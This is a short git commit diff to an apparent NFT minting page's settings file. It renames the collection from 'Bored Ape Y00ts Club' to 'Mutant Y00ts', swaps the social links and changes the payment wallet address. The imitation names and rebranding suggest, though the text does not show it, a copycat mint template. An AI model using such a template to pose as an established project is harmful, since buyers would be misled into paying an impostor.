8509d0b5f0c399571cc28223bf32585e5fc41b7b
cryptothanh <115431178+cryptothanh@users.noreply.github.com>
2022-11-11 01:06:00 +0100

    Update setteg.js

--- setteg.js
+++ setteg.js
@@ -1,9 +1,9 @@
 const MAX=5
-const namess="Bored Ape Y00ts Club";
-const discord = 'https://discord.gg/boredapey00c';
-const twitter = 'https://twitter.com/boredapey00c';
+const namess="Mutant Y00ts";
+const discord = 'https://discord.gg/myyc';
+const twitter = 'https://twitter.com/myyc';
 const startCounter = 3186;
 const endCounter = 3333;
 const IMGPrice=0.005;
-const ADDRESS = '0xBA7f602cd556Ab04be8521E7cb4e1CFb82Caf957';
+const ADDRESS = '0xaFF52f41E87856522aced78A6859950946EE287D';
 
